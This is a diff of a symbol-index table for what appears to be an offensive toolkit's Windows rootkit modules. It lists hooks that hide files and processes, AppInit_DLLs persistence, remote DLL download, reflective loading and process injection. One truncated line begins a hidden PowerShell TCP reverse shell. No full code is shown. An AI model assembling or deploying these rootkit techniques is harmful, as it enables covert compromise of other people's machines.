-| `ensure_pid_file_exists` | function | `modules/win_rootkit/backup.c:85` | `void ensure_pid_file_exists()` |
-| `exit` | function | `modules/win_rootkit/backup.c:78` | `exit(EXIT_FAILURE);` |
-| `fclose` | function | `modules/win_rootkit/backup.c:94` | `fclose(file);` |
-| `fprintf` | function | `modules/win_rootkit/backup.c:111` | `fprintf(stderr, "Attempt %d: Failed to execute process check. Error: %s\n", current_attempt + 1, strerror(errno));` |
-| `free` | function | `modules/win_rootkit/backup.c:206` | `free(client_socket);` |
-| `handle_client` | function | `modules/win_rootkit/backup.c:203` | `DWORD WINAPI handle_client(LPVOID client_socket)` |
-| `infect_command` | function | `modules/win_rootkit/backup.c:178` | `void infect_command()` |
+| `elp` | function | `modules/win_rootkit/backup.c:66` | `void elp()` |
+| `ensure_hide_file_exists` | function | `modules/win_rootkit/backup.c:150` | `void ensure_hide_file_exists()` |
+| `ensure_key_file_exists` | function | `modules/win_rootkit/backup.c:123` | `void ensure_key_file_exists()` |
+| `ensure_pid_file_exists` | function | `modules/win_rootkit/backup.c:86` | `void ensure_pid_file_exists()` |
+| `handle_client` | function | `modules/win_rootkit/backup.c:204` | `DWORD WINAPI handle_client(LPVOID client_socket)` |
+| `infect_command` | function | `modules/win_rootkit/backup.c:179` | `void infect_command()` |
 | `main` | function | `modules/win_rootkit/backup.c:540` | `int main()` |
-| `memset` | function | `modules/win_rootkit/backup.c:221` | `memset(buffer, 0, BUFFER_SIZE);` |
-| `monitor_shell` | function | `modules/win_rootkit/backup.c:428` | `DWORD WINAPI monitor_shell(LPVOID data)` |
-| `perror` | function | `modules/win_rootkit/backup.c:77` | `perror("CreateProcess failed");` |
-| `printf` | function | `modules/win_rootkit/backup.c:69` | `printf("LD_PRELOAD setted as C:\\Windows\\System32\\mrhyde.dll\n");` |
-| `send` | function | `modules/win_rootkit/backup.c:246` | `send(sock, error_msg, strlen(error_msg), 0);` |
-| `snprintf` | function | `modules/win_rootkit/backup.c:299` | `snprintf(command, BUFFER_SIZE, "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPC` |
-| `time` | function | `modules/win_rootkit/backup.c:585` | `time(&start_date);` |
-| `CloseHandle` | function | `modules/win_rootkit/mrhyde.c:100` | `CloseHandle(processesSnapshot);` |
-| `DllMain` | function | `modules/win_rootkit/mrhyde.c:271` | `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)` |
+| `monitor_shell` | function | `modules/win_rootkit/backup.c:430` | `DWORD WINAPI monitor_shell(LPVOID data)` |
+| `DllMain` | function | `modules/win_rootkit/mrhyde.c:272` | `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)` |
 | `FILE_HIDE_PATH` | macro | `modules/win_rootkit/mrhyde.c:9` | `#define FILE_HIDE_PATH` |
-| `FindFirstFile` | function | `modules/win_rootkit/mrhyde.c:176` | `return FindFirstFile(lpFileName, lpFindFileData);` |
-| `FindNextFile` | function | `modules/win_rootkit/mrhyde.c:185` | `return FindNextFile(hFindFile, lpFindFileData);` |
 | `FindProcessId` | function | `modules/win_rootkit/mrhyde.c:89` | `DWORD FindProcessId(const char* processName)` |
-| `FormatMessage` | function | `modules/win_rootkit/mrhyde.c:29` | `FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, errorMsg, sizeof(errorMsg), NULL);` |
-| `HideProcessByPID` | function | `modules/win_rootkit/mrhyde.c:114` | `void HideProcessByPID(DWORD pid)` |
+| `HideProcessByPID` | function | `modules/win_rootkit/mrhyde.c:115` | `void HideProcessByPID(DWORD pid)` |
 | `HookFunctions` | function | `modules/win_rootkit/mrhyde.c:222` | `void HookFunctions()` |
 | `HookedCreateToolhelp32Snapshot` | function | `modules/win_rootkit/mrhyde.c:189` | `HANDLE WINAPI HookedCreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID)` |
 | `HookedFindFirstFile` | function | `modules/win_rootkit/mrhyde.c:171` | `HANDLE WINAPI HookedFindFirstFile(LPCSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData)` |
 | `HookedFindNextFile` | function | `modules/win_rootkit/mrhyde.c:180` | `BOOL WINAPI HookedFindNextFile(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData)` |
 | `HookedProcess32First` | function | `modules/win_rootkit/mrhyde.c:198` | `BOOL WINAPI HookedProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)` |
 | `HookedProcess32Next` | function | `modules/win_rootkit/mrhyde.c:210` | `BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)` |
-| `MAX_HIDE_PIDS` | macro | `modules/win_rootkit/mrhyde.c:6` | `#define MAX_HIDE_PIDS` |
+| `MAX_HIDE_PIDS` | macro | `modules/win_rootkit/mrhyde.c:7` | `#define MAX_HIDE_PIDS` |
 | `PID_FILE_PATH` | macro | `modules/win_rootkit/mrhyde.c:8` | `#define PID_FILE_PATH` |
-| `Process32First` | function | `modules/win_rootkit/mrhyde.c:97` | `Process32First(processesSnapshot, &processInfo);` |
 | `RunExperiment` | function | `modules/win_rootkit/mrhyde.c:19` | `void __cdecl RunExperiment()` |
-| `SetLastError` | function | `modules/win_rootkit/mrhyde.c:173` | `SetLastError(ERROR_FILE_NOT_FOUND);` |
-| `Sleep` | function | `modules/win_rootkit/mrhyde.c:56` | `Sleep(1000 * (retry_count + 1));` |
-| `VirtualProtect` | function | `modules/win_rootkit/mrhyde.c:229` | `VirtualProtect(&originalFindFirstFile, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);` |
-| `fclose` | function | `modules/win_rootkit/mrhyde.c:43` | `fclose(file);` |
-| `fprintf` | function | `modules/win_rootkit/mrhyde.c:30` | `fprintf(stderr, "Error opening PID file: %s\n", errorMsg);` |
-| `free` | function | `modules/win_rootkit/mrhyde.c:284` | `free(hide_pids[i]);` |
-| `load_hidden_files` | function | `modules/win_rootkit/mrhyde.c:46` | `void load_hidden_files()` |
-| `load_hidden_pids` | function | `modules/win_rootkit/mrhyde.c:23` | `void load_hidden_pids()` |
-| `printf` | function | `modules/win_rootkit/mrhyde.c:141` | `printf("Process hidden\n");` |
-| `search_pid` | function | `modules/win_rootkit/mrhyde.c:136` | `BOOL search_pid()` |
-| `should_hide_file` | function | `modules/win_rootkit/mrhyde.c:159` | `BOOL should_hide_file(const char* filename)` |
+| `load_hidden_files` | function | `modules/win_rootkit/mrhyde.c:47` | `void load_hidden_files()` |
+| `load_hidden_pids` | function | `modules/win_rootkit/mrhyde.c:24` | `void load_hidden_pids()` |
+| `search_pid` | function | `modules/win_rootkit/mrhyde.c:137` | `BOOL search_pid()` |
+| `should_hide_file` | function | `modules/win_rootkit/mrhyde.c:161` | `BOOL should_hide_file(const char* filename)` |
 | `should_hide_pid` | function | `modules/win_rootkit/mrhyde.c:147` | `BOOL should_hide_pid(DWORD pid)` |
-| `sprintf` | function | `modules/win_rootkit/mrhyde.c:150` | `sprintf(pid_str, "%lu", pid);` |
-| `strcpy` | function | `modules/win_rootkit/mrhyde.c:129` | `strcpy(pe.szExeFile, "");` |
 | `GetUsernameFromPid` | method | `modules/win_rootkit/win_rin3_rootkit.cs:143` | `` |
 | `HookCreateFile` | method | `modules/win_rootkit/win_rin3_rootkit.cs:224` | `` |
 | `HookFindFirstFile` | method | `modules/win_rootkit/win_rin3_rootkit.cs:212` | `` |
@@ -7992,82 +7769,42 @@ str_cut(char str[], int slice_from, int slice_to)` |
 | `TOKEN_USER` | class | `modules/win_rootkit/win_rin3_rootkit.cs:123` | `` |
 | `WIN32_FIND_DATA` | class | `modules/win_rootkit/win_rin3_rootkit.cs:47` | `` |
 | `WinRing3Rootkit` | class | `modules/win_rootkit/win_rin3_rootkit.cs:30` | `` |
-| `AddDllToAppInitDLLs` | function | `modules/win_rootkit/win_ring3_rootkit.c:190` | `BOOL AddDllToAppInitDLLs(const char* dllPath)` |
-| `BOOL` | function | `modules/win_rootkit/win_ring3_rootkit.c:77` | `typedef BOOL(WINAPI *DllMainEntry)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);` |
+| `AddDllToAppInitDLLs` | function | `modules/win_rootkit/win_ring3_rootkit.c:191` | `BOOL AddDllToAppInitDLLs(const char* dllPath)` |
 | `BUFFER_SIZE` | macro | `modules/win_rootkit/win_ring3_rootkit.c:19` | `#define BUFFER_SIZE` |
-| `CloseHandle` | function | `modules/win_rootkit/win_ring3_rootkit.c:263` | `CloseHandle(snapshot);` |
 | `Command` | struct | `modules/win_rootkit/win_ring3_rootkit.c:28` | `` |
-| `DownloadDLL` | function | `modules/win_rootkit/win_ring3_rootkit.c:78` | `BOOL DownloadDLL(const char* url, PBYTE* buffer, DWORD* size)` |
-| `GetExitCodeThread` | function | `modules/win_rootkit/win_ring3_rootkit.c:352` | `GetExitCodeThread(hThread, &exitCode);` |
-| `GetModuleHandle` | function | `modules/win_rootkit/win_ring3_rootkit.c:289` | `GetModuleHandle("kernel32.dll"), "LoadLibraryA" );` |
-| `GetProcessIdByName` | function | `modules/win_rootkit/win_ring3_rootkit.c:238` | `DWORD GetProcessIdByName(const char* processName)` |
-| `Gifted` | function | `modules/win_rootkit/win_ring3_rootkit.c:268` | `BOOL Gifted(DWORD processId, const char* dllPath)` |
+| `DownloadDLL` | function | `modules/win_rootkit/win_ring3_rootkit.c:79` | `BOOL DownloadDLL(const char* url, PBYTE* buffer, DWORD* size)` |
+| `GetProcessIdByName` | function | `modules/win_rootkit/win_ring3_rootkit.c:240` | `DWORD GetProcessIdByName(const char* processName)` |
+| `Gifted` | function | `modules/win_rootkit/win_ring3_rootkit.c:270` | `BOOL Gifted(DWORD processId, const char* dllPath)` |
 | `HIDE_FILE` | macro | `modules/win_rootkit/win_ring3_rootkit.c:22` | `#define HIDE_FILE` |
-| `InternetCloseHandle` | function | `modules/win_rootkit/win_ring3_rootkit.c:85` | `InternetCloseHandle(hInternet);` |
 | `KEY_FILE` | macro | `modules/win_rootkit/win_ring3_rootkit.c:23` | `#define KEY_FILE` |
 | `MAX_COMMANDS` | macro | `modules/win_rootkit/win_ring3_rootkit.c:20` | `#define MAX_COMMANDS` |
 | `PASSWORD` | macro | `modules/win_rootkit/win_ring3_rootkit.c:25` | `#define PASSWORD` |
 | `PIDArray` | struct | `modules/win_rootkit/win_ring3_rootkit.c:40` | `` |
 | `PID_FILE` | macro | `modules/win_rootkit/win_ring3_rootkit.c:21` | `#define PID_FILE` |
-| `PORT` | macro | `modules/win_rootkit/win_ring3_rootkit.c:17` | `#define PORT` |
-| `ReflectiveLoadDLL` | function | `modules/win_rootkit/win_ring3_rootkit.c:98` | `BOOL ReflectiveLoadDLL(PBYTE dllBuffer, DWORD dllSize)` |
-| `RegCloseKey` | function | `modules/win_rootkit/win_ring3_rootkit.c:215` | `RegCloseKey(hKey);` |
-| `RunExperiment` | function | `modules/win_rootkit/win_ring3_rootkit.c:139` | `RunExperiment();` |
-| `Sleep` | function | `modules/win_rootkit/win_ring3_rootkit.c:410` | `Sleep(1000 * (current_attempt + 1));` |
+| `PORT` | macro | `modules/win_rootkit/win_ring3_rootkit.c:18` | `#define PORT` |
+| `ReflectiveLoadDLL` | function | `modules/win_rootkit/win_ring3_rootkit.c:99` | `BOOL ReflectiveLoadDLL(PBYTE dllBuffer, DWORD dllSize)` |
 | `VirtualFile` | struct | `modules/win_rootkit/win_ring3_rootkit.c:34` | `` |
-| `VirtualFreeEx` | function | `modules/win_rootkit/win_ring3_rootkit.c:324` | `VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);` |
-| `WSACleanup` | function | `modules/win_rootkit/win_ring3_rootkit.c:957` | `WSACleanup();` |
-| `WaitForSingleObject` | function | `modules/win_rootkit/win_ring3_rootkit.c:346` | `WaitForSingleObject(hThread, INFINITE);` |
-| `ZeroMemory` | function | `modules/win_rootkit/win_ring3_rootkit.c:369` | `ZeroMemory(&si, sizeof(si));` |
-| `_pclose` | function | `modules/win_rootkit/win_ring3_rootkit.c:187` | `_pclose(pipe);` |
-| `_putenv_s` | function | `modules/win_rootkit/win_ring3_rootkit.c:712` | `_putenv_s("LD_PRELOAD", "");` |
 | `addPID` | function | `modules/win_rootkit/win_ring3_rootkit.c:153` | `void addPID(PIDArray *array, DWORD pid)` |
-| `closesocket` | function | `modules/win_rootkit/win_ring3_rootkit.c:540` | `closesocket(sock);` |
-| `dllMain` | function | `modules/win_rootkit/win_ring3_rootkit.c:136` | `dllMain((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, NULL);` |
-| `elp` | function | `modules/win_rootkit/win_ring3_rootkit.c:361` | `void elp()` |
-| `ensure_hide_file_exists` | function | `modules/win_rootkit/win_ring3_rootkit.c:445` | `void ensure_hide_file_exists()` |
-| `ensure_key_file_exists` | function | `modules/win_rootkit/win_ring3_rootkit.c:418` | `void ensure_key_file_exists()` |
-| `ensure_pid_file_exists` | function | `modules/win_rootkit/win_ring3_rootkit.c:381` | `void ensure_pid_file_exists()` |
-| `exit` | function | `modules/win_rootkit/win_ring3_rootkit.c:374` | `exit(EXIT_FAILURE);` |
-| `fclose` | function | `modules/win_rootkit/win_ring3_rootkit.c:390` | `fclose(file);` |
-| `fprintf` | function | `modules/win_rootkit/win_ring3_rootkit.c:407` | `fprintf(stderr, "Attempt %d: Failed to execute process check. Error: %s\n", current_attempt + 1, strerror(errno));` |
-| `free` | function | `modules/win_rootkit/win_ring3_rootkit.c:163` | `free(array->pids);` |
+| `elp` | function | `modules/win_rootkit/win_ring3_rootkit.c:362` | `void elp()` |
+| `ensure_hide_file_exists` | function | `modules/win_rootkit/win_ring3_rootkit.c:446` | `void ensure_hide_file_exists()` |
+| `ensure_key_file_exists` | function | `modules/win_rootkit/win_ring3_rootkit.c:419` | `void ensure_key_file_exists()` |
+| `ensure_pid_file_exists` | function | `modules/win_rootkit/win_ring3_rootkit.c:382` | `void ensure_pid_file_exists()` |
 | `freePIDArray` | function | `modules/win_rootkit/win_ring3_rootkit.c:162` | `void freePIDArray(PIDArray *array)` |
-| `getPIDsFromTasklist` | function | `modules/win_rootkit/win_ring3_rootkit.c:165` | `void getPIDsFromTasklist(PIDArray *pidArray)` |
-| `giveGift` | function | `modules/win_rootkit/win_ring3_rootkit.c:474` | `BOOL giveGift()` |
-| `handle_client` | function | `modules/win_rootkit/win_ring3_rootkit.c:524` | `DWORD WINAPI handle_client(LPVOID client_socket)` |
+| `getPIDsFromTasklist` | function | `modules/win_rootkit/win_ring3_rootkit.c:166` | `void getPIDsFromTasklist(PIDArray *pidArray)` |
+| `giveGift` | function | `modules/win_rootkit/win_ring3_rootkit.c:475` | `BOOL giveGift()` |
+| `handle_client` | function | `modules/win_rootkit/win_ring3_rootkit.c:526` | `DWORD WINAPI handle_client(LPVOID client_socket)` |
 | `initPIDArray` | function | `modules/win_rootkit/win_ring3_rootkit.c:146` | `void initPIDArray(PIDArray *array)` |
 | `main` | function | `modules/win_rootkit/win_ring3_rootkit.c:865` | `int main()` |
-| `memcpy` | function | `modules/win_rootkit/win_ring3_rootkit.c:107` | `memcpy(baseAddress, dllBuffer, ntHeader->OptionalHeader.SizeOfHeaders);` |
-| `memset` | function | `modules/win_rootkit/win_ring3_rootkit.c:543` | `memset(buffer, 0, BUFFER_SIZE);` |
-| `monitor_shell` | function | `modules/win_rootkit/win_ring3_rootkit.c:753` | `DWORD WINAPI monitor_shell(LPVOID data)` |
-| `perror` | function | `modules/win_rootkit/win_ring3_rootkit.c:373` | `perror("CreateProcess failed");` |
-| `printf` | function | `modules/win_rootkit/win_ring3_rootkit.c:172` | `printf("Error al ejecutar tasklist\n");` |
-| `send` | function | `modules/win_rootkit/win_ring3_rootkit.c:568` | `send(sock, error_msg, strlen(error_msg), 0);` |
-| `snprintf` | function | `modules/win_rootkit/win_ring3_rootkit.c:621` | `snprintf(command, BUFFER_SIZE, "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPC` |
-| `strcat` | function | `modules/win_rootkit/win_ring3_rootkit.c:224` | `strcat(valueData, dllPath);` |
-| `strcpy` | function | `modules/win_rootkit/win_ring3_rootkit.c:168` | `strcpy(command, "tasklist /FO CSV /NH");` |
-| `time` | function | `modules/win_rootkit/win_ring3_rootkit.c:912` | `time(&start_date);` |
-| `void` | function | `modules/win_rootkit/win_ring3_rootkit.c:74` | `typedef void (__cdecl *RunExperimentFunc)();` |
-| `wcstombs_s` | function | `modules/win_rootkit/win_ring3_rootkit.c:254` | `wcstombs_s(&converted, exeName, sizeof(exeName), processEntry.szExeFile, MAX_PATH);` |
-| `CloseHandle` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:50` | `CloseHandle(hProcessSnap);` |
-| `DetourAttach` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:99` | `DetourAttach(&(PVOID&)original_FindFirstFile, hook_FindFirstFile);` |
-| `DetourDetach` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:106` | `DetourDetach(&(PVOID&)original_FindFirstFile, hook_FindFirstFile);` |
-| `DetourTransactionBegin` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:96` | `case DLL_PROCESS_ATTACH: DetourTransactionBegin();` |
-| `DetourTransactionCommit` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:101` | `DetourTransactionCommit();` |
-| `DetourUpdateThread` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:98` | `DetourUpdateThread(GetCurrentThread());` |
-| `DllMain` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:93` | `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)` |
-| `HIDDEN_DIR` | macro | `modules/win_rootkit/win_ring3_rootkit.cpp:31` | `#define HIDDEN_DIR` |
+| `monitor_shell` | function | `modules/win_rootkit/win_ring3_rootkit.c:755` | `DWORD WINAPI monitor_shell(LPVOID data)` |
+| `DllMain` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:94` | `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)` |
+| `HIDDEN_DIR` | macro | `modules/win_rootkit/win_ring3_rootkit.cpp:32` | `#define HIDDEN_DIR` |
 | `HIDDEN_FILE` | macro | `modules/win_rootkit/win_ring3_rootkit.cpp:33` | `#define HIDDEN_FILE` |
 | `HIDE_USER` | macro | `modules/win_rootkit/win_ring3_rootkit.cpp:34` | `#define HIDE_USER` |
 | `MAX_HIDE_PIDS` | macro | `modules/win_rootkit/win_ring3_rootkit.cpp:35` | `#define MAX_HIDE_PIDS` |
-| `SetLastError` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:77` | `SetLastError(ERROR_FILE_NOT_FOUND);` |
-| `get_username_from_pid` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:41` | `char* get_username_from_pid(DWORD pid)` |
+| `get_username_from_pid` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:42` | `char* get_username_from_pid(DWORD pid)` |
 | `hook_CreateFile` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:85` | `HANDLE WINAPI hook_CreateFile(CONST char* path, DWORD access, DWORD share, LPSECURITY_ATTRIBUTES ...` |
 | `hook_FindFirstFile` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:75` | `HANDLE WINAPI hook_FindFirstFile(CONST char* path, WIN32_FIND_DATA* find_data)` |
-| `original_CreateFile` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:90` | `return original_CreateFile(path, access, share, security, creation, flags, template);` |
-| `original_FindFirstFile` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:80` | `return original_FindFirstFile(path, find_data);` |
-| `should_hide_pid` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:64` | `int should_hide_pid(const char* pid)` |
+| `should_hide_pid` | function | `modules/win_rootkit/win_ring3_rootkit.cpp:65` | `int should_hide_pid(const char* pid)` |
 | `CredentialEntry` | class | `modules/world_model.py:189` | `class CredentialEntry` |
 | `DomainEntry` | class | `modules/world_model.py:215` | `class DomainEntry` |
 | `EmailEntry` | class | `modules/world_model.py:207` | `class EmailEntry` |
